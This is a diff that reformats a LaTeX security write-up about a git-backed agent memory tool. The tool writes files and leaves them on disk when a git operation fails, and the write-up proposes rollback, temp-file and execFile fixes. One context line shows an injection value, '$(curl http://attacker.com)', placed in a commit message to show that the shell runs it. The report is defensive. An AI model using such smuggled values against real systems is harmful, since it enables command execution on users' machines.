@@ -22,10 +22,9 @@ This creates a \textbf{silent data integrity failure} with three consequences:
 
 The bug is in \texttt{src/tools/memory.ts:161-171}, where the git operations are wrapped in a try/catch that reports the error but does not restore the original file content or unstage the changes.
 
----
 
 \subsection*{Root Cause Analysis}
-\#\#\# The Code
+\subsubsection*{The Code}
 
 
 
@@ -65,7 +64,7 @@ return {
 
 
 
-\#\#\# The Three Consequences
+\subsubsection*{The Three Consequences}
 
 \textbf{Scenario A: \texttt{git add} fails (dirty index, merge conflict, pre-existing unstaged changes)}
 
@@ -120,7 +119,7 @@ remember: the user said $(curl http://attacker.com)
 
 Then the shell executes the \texttt{curl} command before git runs. If the \texttt{curl} fails (network error), git commit itself never executes, but the memory file was already written.
 
-\#\#\# Why This Is High Severity
+\subsubsection*{Why This Is High Severity}
 
 For an agent that relies on git-backed memory as its primary persistence mechanism, data integrity is critical:
 
@@ -129,10 +128,9 @@ For an agent that relies on git-backed memory as its primary persistence mechani
 3. \textbf{Error recovery is limited}: The error message says "The file was still written" but provides no guidance on how to recover
 4. \textbf{Silent corruption}: A subsequent successful commit from another operation quietly includes the orphaned content
 
----
 
 \subsection*{Fix Implementation}
-\#\#\# Option A: Atomic Rollback (Recommended)
+\subsubsection*{Option A: Atomic Rollback (Recommended)}
 
 
 
@@ -188,7 +186,7 @@ async execute(...) {
 2. Git index is reset to unstage the changes
 3. Error message is accurate about the state
 
-\#\#\# Option B: Atomic Temp-File Write
+\subsubsection*{Option B: Atomic Temp-File Write}
 
 Use a temporary file and rename (atomic operation):
 
@@ -222,7 +220,7 @@ try {
 
 
 
-\#\#\# Option C: Use \texttt{execFile} to Prevent Shell Injection in Commit Message
+\subsubsection*{Option C: Use \texttt{execFile} to Prevent Shell Injection in Commit Message}
 
 
 
@@ -243,7 +241,6 @@ try {
 
 This eliminates shell injection entirely because \texttt{execFileSync} does not invoke a shell.
 
----
 
 \subsection*{Affected Files}
 \begin{itemize}
